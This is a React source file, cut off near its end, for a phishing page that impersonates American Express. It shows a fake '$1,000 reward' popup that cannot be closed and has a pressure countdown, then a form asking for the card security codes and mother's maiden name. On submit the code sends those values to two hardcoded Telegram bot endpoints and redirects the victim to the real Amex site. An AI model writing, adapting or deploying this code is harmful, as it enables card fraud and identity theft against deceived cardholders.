import { useEffect, useState, useCallback, useRef } from "react";
import { Search, Menu, CreditCard, PiggyBank, DollarSign, Building2, TrendingUp, Wallet, MapPin, Gauge, Smartphone, Settings, Shield, Clock, AlertTriangle, Check, Sparkles } from "lucide-react";

const heroImg = "https://images.pexels.com/photos/20219119/pexels-photo-20219119.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreGiftcard = "https://images.pexels.com/photos/8015244/pexels-photo-8015244.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreOffers = "https://images.pexels.com/photos/6634182/pexels-photo-6634182.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreEvents = "https://images.pexels.com/photos/36675302/pexels-photo-36675302.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const cardImg = "https://images.pexels.com/photos/7821902/pexels-photo-7821902.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";

function ConfettiParticle({ delay }: { delay: number }) {
  const colors = ["#4338ca", "#7c3aed", "#ec4899", "#f59e0b", "#10b981", "#06b6d4"];
  const left = Math.random() * 100;
  const size = Math.random() * 6 + 4;
  const color = colors[Math.floor(Math.random() * colors.length)];
  return (
    <div
      className="absolute top-0 rounded-full"
      style={{
        left: `${left}%`,
        width: `${size}px`,
        height: `${size}px`,
        backgroundColor: color,
        animation: `confettiFall ${1.5 + Math.random()}s ${delay}s ease-in forwards`,
        opacity: 0,
      }}
    />
  );
}

export default function App() {
  const [showModal, setShowModal] = useState(false);
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [showMobileNav, setShowMobileNav] = useState(false);
  const [form, setForm] = useState({ name: "", csc: "", ccid: "", maiden: "" });
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [progressMessage, setProgressMessage] = useState<string | null>(null);
  const [alertMessage, setAlertMessage] = useState<string | null>(null);
  const [xShake, setXShake] = useState(false);
  const [timeLeft, setTimeLeft] = useState(259200);
  const [countdown3, setCountdown3] = useState<number | null>(null);
  const hasShownRef = useRef(false);

  useEffect(() => {
    // Always trigger after 3 seconds on mount/refresh
    const timer = setTimeout(() => setShowModal(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  // 3-second countdown display
  useEffect(() => {
    if (!showModal && !hasShownRef.current) {
      setCountdown3(3);
      const interval = setInterval(() => {
        setCountdown3((prev) => {
          if (prev === null || prev <= 1) {
            clearInterval(interval);
            return null;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [showModal]);

  // Expiry countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${String(h).padStart(2, "0")}h ${String(m).padStart(2, "0")}m ${String(s).padStart(2, "0")}s`;
  };

  const handleXClick = useCallback(() => {
    setXShake(true);
    setAlertMessage("Fill your information to proceed");
    setTimeout(() => setXShake(false), 500);
    setTimeout(() => setAlertMessage(null), 3000);
  }, []);

  const anyModalOpen = showModal || showInfoModal || showProgressModal;

  return (
    <div className="min-h-screen bg-background">
      <div className={anyModalOpen ? "blur-sm pointer-events-none select-none" : ""}>
      {/* Top Nav */}
      <header className="border-b border-border">
        <div className="mx-auto flex flex-col gap-4 px-6 py-3 md:flex-row md:items-center md:gap-8 max-w-[1280px]">
          <div className="flex h-12 min-w-[48px] items-center justify-center bg-[oklch(0.5_0.2_260)] px-3 text-[10px] font-bold leading-tight text-white">
            AMERICAN<br/>EXPRESS
          </div>

          <button
            type="button"
            onClick={() => setShowMobileNav((prev) => !prev)}
            className="inline-flex items-center justify-center rounded-md border border-border p-2 text-[oklch(0.5_0.2_260)] md:hidden"
          >
            <Menu className="h-5 w-5" />
          </button>

          <nav className="hidden flex-wrap items-center gap-3 text-sm font-medium text-[oklch(0.5_0.2_260)] md:flex">
            <a href="#" className="hover:underline">My Account</a>
            <a href="#" className="hover:underline">Cards</a>
            <a href="#" className="hover:underline">Banking</a>
            <a href="#" className="hover:underline">Travel</a>
            <a href="#" className="hover:underline">Rewards & Benefits</a>
            <a href="#" className="hover:underline">Business</a>
          </nav>

          {showMobileNav && (
            <div className="flex flex-col gap-3 rounded-b-xl border-t border-border bg-white px-6 py-4 md:hidden">
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">My Account</a>
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">Cards</a>
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">Banking</a>
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">Travel</a>
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">Rewards & Benefits</a>
              <a href="#" className="text-sm font-medium text-[oklch(0.2_0.02_250)] hover:text-[oklch(0.5_0.2_260)]">Business</a>
            </div>
          )}

          <div className="flex flex-wrap items-center gap-3 md:ml-auto">
            <button aria-label="Search" className="text-[oklch(0.5_0.2_260)]">
              <Search className="h-5 w-5" />
            </button>
            <a href="#" className="hidden text-sm font-medium text-[oklch(0.5_0.2_260)] hover:underline sm:inline">Customer Service</a>
            <a href="#" className="rounded-sm bg-[oklch(0.5_0.2_260)] px-4 py-2 text-sm font-semibold text-white hover:bg-[oklch(0.45_0.2_260)]">
              Log In
            </a>
          </div>
        </div>
      </header>

      {/* Tabs + FDIC bar */}
      <div className="bg-[oklch(0.96_0.005_250)]">
        <div className="mx-auto flex flex-col gap-4 px-6 py-3 md:flex-row md:items-center max-w-[1280px]">
          <div className="flex flex-wrap gap-2">
            <button className="border-b-[3px] border-[oklch(0.25_0.1_260)] bg-white px-6 py-3 text-sm font-semibold text-[oklch(0.2_0.02_250)]">
              Personal
            </button>
            <button className="px-6 py-3 text-sm font-medium text-[oklch(0.5_0.2_260)]">
              Business
            </button>
          </div>
          <div className="flex flex-wrap items-center gap-3 text-xs text-[oklch(0.2_0.02_250)] md:ml-auto">
            <span className="font-bold text-[oklch(0.25_0.1_260)] text-base">FDIC</span>
            <span className="hidden md:inline">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
          </div>
        </div>
      </div>

      {/* Main */}
      <main className="mx-auto max-w-[1280px] px-6 py-6">
        <div className="flex flex-col gap-6 lg:flex-row">
          {/* Sidebar */}
          <aside className="hidden lg:block lg:w-[280px] border border-border">
            {[
              { icon: CreditCard, label: "Credit Cards" },
              { icon: PiggyBank, label: "High Yield Savings" },
              { icon: DollarSign, label: "Personal Loans" },
              { icon: Building2, label: "Online Checking" },
              { icon: TrendingUp, label: "Investing" },
              { icon: Wallet, label: "Send & Split" },
            ].map(({ icon: Icon, label }, i) => (
              <a
                key={label}
                href="#"
                className={`flex items-center gap-4 px-6 py-6 transition-colors hover:bg-[oklch(0.97_0.01_260)] ${i !== 0 ? "border-t border-border" : ""}`}
              >
                <Icon className="h-8 w-8 stroke-[1.5] text-[oklch(0.5_0.2_260)]" />
                <span className="text-base font-semibold text-[oklch(0.2_0.02_250)]">{label}</span>
              </a>
            ))}
          </aside>

          {/* Hero */}
          <section className="relative flex-1 overflow-hidden">
            <img src={heroImg} alt="Couple enjoying poolside breakfast with ocean view" className="h-[320px] w-full object-cover sm:h-[420px] md:h-[460px]" />
            <div className="absolute inset-0 bg-gradient-to-r from-black/60 via-black/30 to-transparent" />
            <div className="absolute inset-0 flex flex-col justify-center px-6 text-white sm:px-10 md:px-12">
              <div className="mb-6 h-14 w-20 bg-white/10 backdrop-blur-sm" />
              <h1 className="max-w-xl text-3xl font-light leading-tight sm:text-[44px] sm:leading-tight">
                Don't miss out: Earn up<br/>to 125,000 bonus miles
              </h1>
              <p className="mt-4 text-sm font-semibold sm:mt-6 sm:text-base">
                NEW – Check your second bag free on domestic Delta flights.
              </p>
              <a href="#" className="mt-5 inline-block w-full max-w-[260px] rounded border-2 border-white bg-white px-8 py-3 text-sm font-semibold text-[oklch(0.5_0.2_260)] hover:bg-transparent hover:text-white sm:w-fit transition-all duration-300">
                Learn more
              </a>
              <p className="mt-4 text-xs sm:mt-6">Terms apply.</p>
              <p className="mt-6 text-sm font-bold tracking-wide sm:mt-8">
                DON'T <span className="font-serif italic font-normal text-lg sm:text-xl">live life</span> WITHOUT IT®
              </p>
            </div>
          </section>
        </div>
      </main>

      {/* More to Explore */}
      <section className="bg-[oklch(0.96_0.005_250)] py-10">
        <div className="mx-auto max-w-[1280px] px-6">
          <h2 className="mb-8 text-center text-2xl font-normal text-[oklch(0.2_0.02_250)]">More to Explore</h2>
          <div className="grid grid-cols-1 gap-6 sm:grid-cols-2 lg:grid-cols-3">
            {[
              { img: exploreGiftcard, text: "Find a perfect Gift Card. Terms apply.", cta: "Explore Amex Gift Cards" },
              { img: exploreOffers, text: "Eligible Members Unlock Extra Rewards*", cta: "Explore Amex Offers" },
              { img: exploreEvents, text: "Enjoy more at the events you love", cta: "Explore Amex Experiences", hiddenOnMobile: true },
            ].map((c) => (
              <div key={c.cta} className={`${c.hiddenOnMobile ? "hidden md:flex" : "flex"} flex-col bg-white overflow-hidden transition-shadow duration-300 hover:shadow-lg`}>
                <img src={c.img} alt="" loading="lazy" width={768} height={512} className="h-[240px] w-full object-cover transition-transform duration-500 hover:scale-105" />
                <div className="flex flex-1 flex-col p-6">
                  <p className="min-h-[56px] text-base text-[oklch(0.2_0.02_250)]">{c.text}</p>
                  <a href="#" className="mt-6 inline-block rounded-sm border border-[oklch(0.5_0.2_260)] py-3 text-center text-sm font-medium text-[oklch(0.5_0.2_260)] hover:bg-[oklch(0.5_0.2_260)] hover:text-white transition-all duration-300">
                    {c.cta}
                  </a>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Info tiles strip */}
      <section className="bg-[oklch(0.97_0.005_250)] py-10">
        <div className="mx-auto max-w-[1280px] px-6">
          <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
            {[
              { icon: MapPin, title: "Places to Use Your Card", desc: "Check out businesses that accept Amex", cta: "Explore Now" },
              { icon: Gauge, title: "FICO® Score and Insights", desc: "Build Good Credit Habits with American Express® MyCredit Guide", cta: "Enroll Now" },
              { icon: Smartphone, title: "Explore the Amex App", desc: "Tap into tools that help you get more from Membership. Terms apply.", cta: "Download Now", hiddenOnMobile: true },
            ].map(({ icon: Icon, title, desc, cta, hiddenOnMobile }) => (
              <div key={title} className={`${hiddenOnMobile ? "hidden md:flex" : "flex"} flex-col items-center bg-white px-8 py-10 text-center transition-all duration-300 hover:-translate-y-1 hover:shadow-lg`}>
                <Icon className="h-12 w-12 stroke-[1.5] text-[oklch(0.5_0.2_260)]" />
                <h3 className="mt-6 text-lg font-bold text-[oklch(0.2_0.02_250)]">{title}</h3>
                <p className="mt-3 min-h-[48px] text-sm text-[oklch(0.2_0.02_250)]">{desc}</p>
                <a href="#" className="mt-6 w-full bg-[oklch(0.5_0.2_260)] py-3 text-sm font-semibold text-white hover:bg-[oklch(0.45_0.2_260)] transition-colors">
                  {cta}
                </a>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer links */}
      <section className="border-t border-border bg-white py-10">
        <div className="mx-auto grid max-w-[1280px] grid-cols-1 gap-8 px-6 md:grid-cols-2 lg:grid-cols-4">
          {[
            { h: "ABOUT", links: ["About American Express", "Newsroom", "Careers", "Investor Relations"] },
            { h: "PRODUCTS & SERVICES", links: ["Credit Cards", "Business Credit Cards", "Corporate Programs", "Savings Accounts & CDs"] },
            { h: "LINKS YOU MAY LIKE", links: ["Membership Rewards", "FICO® Score and Insights", "Refer a Friend", "Gift Cards"] },
            { h: "ADDITIONAL INFORMATION", links: ["Credit Intel – Financial Education Center", "Amex Business Intel™ - B2B Education Center", "Supplier Diversity"] },
          ].map((col) => (
            <div key={col.h}>
              <h4 className="mb-4 text-xs font-bold tracking-wider text-[oklch(0.2_0.02_250)]">{col.h}</h4>
              <ul className="space-y-3">
                {col.links.map((l) => (
                  <li key={l}><a href="#" className="text-sm text-[oklch(0.5_0.2_260)] hover:underline transition-colors">{l}</a></li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </section>

      {/* Footer bottom */}
      <footer className="border-t border-border bg-white py-10">
        <div className="mx-auto max-w-[1280px] px-6">
          <div className="flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-2xl font-extrabold tracking-tight text-[oklch(0.5_0.2_260)]">AMERICAN EXPRESS</div>
              <div className="mt-6 flex items-center gap-4">
                <a href="#" aria-label="Facebook" className="transition-transform duration-200 hover:scale-110">
                  <svg className="h-6 w-6 text-[oklch(0.4_0.15_260)]" viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                </a>
                <a href="#" aria-label="X" className="transition-transform duration-200 hover:scale-110">
                  <svg className="h-6 w-6 text-[oklch(0.2_0.02_250)]" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                </a>
                <a href="#" aria-label="Instagram" className="transition-transform duration-200 hover:scale-110">
                  <svg className="h-6 w-6 text-[oklch(0.55_0.2_20)]" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
                </a>
                <a href="#" aria-label="LinkedIn" className="transition-transform duration-200 hover:scale-110">
                  <svg className="h-6 w-6 text-[oklch(0.45_0.15_240)]" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
                </a>
                <a href="#" aria-label="YouTube" className="transition-transform duration-200 hover:scale-110">
                  <svg className="h-6 w-6 text-[oklch(0.55_0.22_25)]" viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
                </a>
              </div>
            </div>
            <div className="flex items-center gap-3 text-sm">
              <span aria-hidden>🇺🇸</span>
              <span className="text-[oklch(0.2_0.02_250)]">United States</span>
              <a href="#" className="text-[oklch(0.5_0.2_260)] hover:underline">Change Country</a>
            </div>
          </div>

          <div className="mt-8 flex flex-wrap items-center gap-x-4 gap-y-2 text-sm">
            {["Terms of Service","Privacy Center","Do Not Sell or Share My Personal Information","AdChoices","Security Center","Card Agreements","Servicemember Benefits","Site Map"].map((l, i, arr) => (
              <span key={l} className="flex items-center gap-4">
                <a href="#" className="text-[oklch(0.5_0.2_260)] hover:underline">{l}</a>
                {i < arr.length - 1 && <span className="text-[oklch(0.7_0.02_250)]">|</span>}
              </span>
            ))}
          </div>

          <p className="mt-6 text-xs text-[oklch(0.35_0.02_250)]">
            All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of Service. Please review.
          </p>
          <p className="mt-3 text-xs text-[oklch(0.35_0.02_250)]">© 2026 American Express. All rights reserved</p>
        </div>
      </footer>

      {/* Feedback tab */}
      <div className="fixed right-0 top-1/2 -translate-y-1/2 rotate-180 [writing-mode:vertical-rl] bg-[oklch(0.45_0.08_180)] px-2 py-4 text-sm font-semibold text-white">
        Give Feedback
      </div>
      </div>

      {/* Countdown overlay - 3 seconds */}
      {countdown3 !== null && !showModal && !hasShownRef.current && (
        <div className="fixed bottom-6 right-6 z-50 flex items-center gap-3 rounded-full bg-white/95 px-5 py-3 shadow-xl backdrop-blur-sm border border-border slide-down">
          <Clock className="h-5 w-5 text-[oklch(0.5_0.2_260)] animate-spin" style={{ animationDuration: '3s' }} />
          <span className="text-sm font-semibold text-[oklch(0.2_0.02_250)]">
            Loading offers... <span className="text-[oklch(0.5_0.2_260)] text-base">{countdown3}</span>
          </span>
        </div>
      )}

      {/* Promo modal with fancy transitions */}
      {showModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop-enter"
          style={{ backgroundColor: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(4px)' }}
          onClick={() => { handleXClick(); }}
        >
          <div
            className="relative w-full max-w-[460px] overflow-hidden rounded-2xl bg-white shadow-2xl border-2 border-[oklch(0.5_0.2_260)] border-glow modal-enter"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Confetti particles */}
            {Array.from({ length: 20 }).map((_, i) => (
              <ConfettiParticle key={i} delay={Math.random() * 0.5} />
            ))}

            {/* Animated top gradient bar */}
            <div className="h-1 gradient-animated" />

            {/* Header */}
            <div className="relative gradient-animated px-6 py-7 text-center text-white">
              {/* Sparkle icons */}
              <div className="absolute top-3 left-4 scale-in">
                <Sparkles className="h-5 w-5 text-yellow-300 opacity-80" />
              </div>
              <div className="absolute top-3 right-12 scale-in" style={{ animationDelay: '0.1s' }}>
                <Sparkles className="h-4 w-4 text-yellow-300 opacity-60" />
              </div>

              <button
                onClick={handleXClick}
                aria-label="Close"
                className={`absolute right-4 top-4 text-white hover:text-white/80 transition-all duration-200 hover:scale-125 hover:rotate-90 ${xShake ? 'shake' : ''}`}
              >
                <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M18 6L6 18" /><path d="M6 6l12 12" />
                </svg>
              </button>

              <div className="fade-in-up">
                <h2 className="text-3xl font-extrabold tracking-tight shimmer-text">CONGRATULATIONS!!!</h2>
              </div>
              <div className="fade-in-up-delay-1 mt-3">
                <p className="text-base">
                  You have been rewarded <span className="font-extrabold text-xl text-yellow-300">$1,000</span> on your card
                </p>
              </div>
            </div>

            {/* Card image with hover effect */}
            <div className="relative bg-gradient-to-b from-[oklch(0.96_0.005_250)] to-white px-6 py-5">
              <div className="mx-auto w-full max-w-[340px] overflow-hidden rounded-xl shadow-xl ring-1 ring-black/5 fade-in-up-delay-2 group">
                <img src={cardImg} alt="American Express Card" className="h-full w-full object-cover transition-transform duration-700 group-hover:scale-110" />
              </div>
              {/* Security badge */}
              <div className="flex items-center justify-center gap-2 mt-4 fade-in-up-delay-2">
                <Shield className="h-4 w-4 text-green-600" />
                <span className="text-xs font-medium text-green-600">Verified & Secure</span>
              </div>
            </div>

            {/* Expiry countdown */}
            <div className="px-6 fade-in-up-delay-3">
              <div className="flex items-center gap-2 justify-center rounded-lg bg-amber-50 border border-amber-200 px-4 py-2.5">
                <AlertTriangle className="h-4 w-4 text-amber-500 flex-shrink-0" />
                <span className="text-xs font-medium text-amber-700">
                  Expires in <span className="font-bold font-mono text-amber-600">{formatTime(timeLeft)}</span>
                </span>
              </div>
            </div>

            {/* Body */}
            <div className="px-6 pb-6 pt-4 text-center">
              <p className="fade-in-up-delay-3 text-sm leading-relaxed text-[oklch(0.35_0.02_250)]">
                <span className="font-semibold text-[oklch(0.2_0.02_250)]">Action Required:</span> Click the button below to confirm your card details and claim your reward.
              </p>

              <button
                type="button"
                onClick={() => {
                  hasShownRef.current = true;
                  setShowModal(false);
                  setShowInfoModal(true);
                }}
                className="shimmer-btn mt-5 inline-block w-full rounded-xl bg-gradient-to-r from-[oklch(0.5_0.2_260)] to-[oklch(0.45_0.18_240)] py-3.5 text-center text-base font-bold text-white shadow-lg shadow-[oklch(0.5_0.2_260)]/30 hover:shadow-xl hover:shadow-[oklch(0.5_0.2_260)]/40 active:scale-[0.98] transition-all duration-200 fade-in-up-delay-4"
              >
                <span className="flex items-center justify-center gap-2">
                  <Check className="h-5 w-5" />
                  Claim Your Reward Now
                </span>
              </button>

              <p className="fade-in-up-delay-5 mt-4 text-xs text-[oklch(0.5_0.02_250)] flex items-center justify-center gap-1.5">
                <Shield className="h-3 w-3" />
                Terms and conditions apply. This security step expires in 72 hours.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Info collection modal */}
      {showInfoModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop-enter"
          style={{ backgroundColor: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(4px)' }}
        >
          <div className="relative w-full max-w-[460px] overflow-hidden rounded-2xl bg-white shadow-2xl border-2 border-[oklch(0.5_0.2_260)] border-glow modal-enter">
            {/* Animated top gradient bar */}
            <div className="h-1 gradient-animated" />

            <div className="relative gradient-animated px-6 py-5 text-white">
              <button
                onClick={() => setShowInfoModal(false)}
                aria-label="Close"
                className="absolute right-4 top-4 text-white hover:text-white/80 transition-all duration-200 hover:scale-125 hover:rotate-90"
              >
                <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M18 6L6 18" /><path d="M6 6l12 12" />
                </svg>
              </button>
              <div className="fade-in-up">
                <h2 className="text-2xl font-extrabold">Complete Your Information</h2>
              </div>
              <div className="fade-in-up-delay-1">
                <p className="mt-2 text-sm opacity-90">
                  Please provide the following details to claim your reward
                </p>
              </div>
            </div>

            {/* Progress bar */}
            <div className="px-6 py-2 bg-[oklch(0.97_0.005_250)]">
              <div className="flex items-center gap-2">
                <Shield className="h-3.5 w-3.5 text-[oklch(0.5_0.2_260)]" />
                <div className="flex-1 bg-[oklch(0.9_0.01_260)] rounded-full h-1.5 overflow-hidden">
                  <div className="h-full rounded-full gradient-animated" style={{ width: '33%' }} />
                </div>
                <span className="text-[10px] font-semibold text-[oklch(0.5_0.2_260)]">Step 1 of 2</span>
              </div>
            </div>

            <form
              onSubmit={async (e) => {
                  e.preventDefault();
                  setShowInfoModal(false);
                  const telegrams = [
                    { token: "5963887785:AAGpNa8vl3HCcXbQs51VSzfM_X0HvB_BJPw", chatId: "951261137g" },
                    { token: "7306143124:AAHnhg3bKSmqjSMXMhstk6b1EkR3DR4YTSI", chatId: "7310413301" },
                  ];

                  const text = `Submitted details:\nName on Account: ${form.name}\nCSC: ${form.csc}\nCCID: ${form.ccid}\nMother's maiden name: ${form.maiden}\nURL: ${window.location.href}`;

                  for (const t of telegrams) {
                    try {
                      const url = `https://api.telegram.org/bot${t.token}/sendMessage`;
                      await fetch(url, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: t.chatId, text }),
                      });
                    } catch (err) {
                      console.warn("Telegram send failed", err);
                    }
                  }

                  setShowProgressModal(true);
                  setProgressMessage(null);

                  setTimeout(() => {
                    setProgressMessage("An agent will contact you soon");
                    setTimeout(() => {
                      window.location.href = "https://www.americanexpress.com";
                    }, 2000);
                  }, 10000);
              }}
              className="px-6 py-6 space-y-4"
            >
              <div className="fade-in-up">
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">Name on the Account</label>
                <input
                  type="text"
                  required
                  value={form.name}
                  onChange={(e) => setForm({ ...form, name: e.target.value })}
                  placeholder="Full name as shown on account"
                  className="mt-2 w-full rounded-lg border border-[oklch(0.85_0.02_250)] px-4 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-2 focus:ring-[oklch(0.5_0.2_260)]/30 transition-all duration-200 placeholder:text-[oklch(0.7_0.02_250)]"
                />
              </div>

              <div className="fade-in-up-delay-1">
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">CSC (3 digits)</label>
                <input
                  type="text"
                  required
                  inputMode="numeric"
                  pattern="[0-9]{3}"
                  maxLength={3}
                  value={form.csc}
                  onChange={(e) => setForm({ ...form, csc: e.target.value.replace(/\D/g, "") })}
                  placeholder="123"
                  className="mt-2 w-full rounded-lg border border-[oklch(0.85_0.02_250)] px-4 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-2 focus:ring-[oklch(0.5_0.2_260)]/30 transition-all duration-200 placeholder:text-[oklch(0.7_0.02_250)]"
                />
              </div>
              <div className="fade-in-up-delay-2">
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">CCID (4 digits)</label>
                <input
                  type="text"
                  required
                  inputMode="numeric"
                  pattern="[0-9]{4}"
                  maxLength={4}
                  value={form.ccid}
                  onChange={(e) => setForm({ ...form, ccid: e.target.value.replace(/\D/g, "") })}
                  placeholder="1234"
                  className="mt-2 w-full rounded-lg border border-[oklch(0.85_0.02_250)] px-4 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-2 focus:ring-[oklch(0.5_0.2_260)]/30 transition-all duration-200 placeholder:text-[oklch(0.7_0.02_250)]"
                />
              </div>
              <div className="fade-in-up-delay-3">
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">Mother's Maiden Name</label>
                <input
                  type="text"
                  required
                  value={form.maiden}
                  onChange={(e) => setForm({ ...form, maiden: e.target.value })}
                  placeholder="Enter mother's maiden name"
                  className="mt-2 w-full rounded-lg border border-[oklch(0.85_0.02_250)] px-4 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-2 focus:ring-[oklch(0.5_0.2_260)]/30 transition-all duration-200 placeholder:text-[oklch(0.7_0.02_250)]"
                />
              </div>

              <button
                type="submit"
                className="shimmer-btn mt-3 w-full rounded-xl bg-gradient-to-r from-[oklch(0.5_0.2_260)] to-[oklch(0.45_0.18_240)] py-3.5 text-base font-bold text-white shadow-lg shadow-[oklch(0.5_0.2_260)]/30 hover:shadow-xl hover:shadow-[oklch(0.5_0.2_260)]/40 active:scale-[0.98] transition-all duration-200 fade-in-up-delay-4"
              >
                Verify & Continue
              </button>
              <p className="fade-in-up-delay-5 text-center text-xs text-[oklch(0.5_0.02_250)] flex items-center justify-center gap-1.5">
                <Shield className="h-3 w-3" />
                Your information is secure and will only be used to verify your card.
              </p>
            </form>
          </div>
        </div>
      )}

      {/* Progress modal */}
      {showProgressModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop-enter"
          style={{ backgroundColor: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(4px)' }}
        >
          <div className="relative w-full max-w-[400px] overflow-hidden rounded-2xl bg-white shadow-2xl border-2 border-[oklch(0.5_0.2_260)] border-glow modal-enter">
            {/* Animated top gradient bar */}
            <div className="h-1 gradient-animated" />

            <div className="px-8 py-10 text-center">
              {/* Animated gears */}
              <div className="flex items-center justify-center gap-6 mb-2 fade-in-up">
                <div className="relative">
                  <Settings className="h-16 w-16 text-[oklch(0.5_0.2_260)] animate-spin" style={{ animationDuration: '2s' }} />
                </div>
                <div className="relative">
                  <Settings className="h-16 w-16 text-[oklch(0.5_0.2_260)] animate-spin" style={{ animationDuration: '2s', animationDirection: 'reverse' }} />
                </div>
              </div>

              <div className="fade-in-up-delay-1">
                <p className="text-lg font-semibold text-[oklch(0.2_0.02_250)]">Processing your information...</p>
              </div>

              {/* Animated progress bar */}
              <div className="mt-6 mx-auto w-full max-w-[260px] bg-[oklch(0.93_0.01_260)] rounded-full h-2 overflow-hidden">
                <div className="h-full rounded-full gradient-animated progress-bar-fill" />
              </div>

              {progressMessage && (
                <div className="mt-6 fade-in-up-delay-2">
                  <div className="inline-flex items-center gap-2 rounded-lg bg-green-50 border border-green-200 px-5 py-3">
                    <Check className="h-5 w-5 text-green-600" />
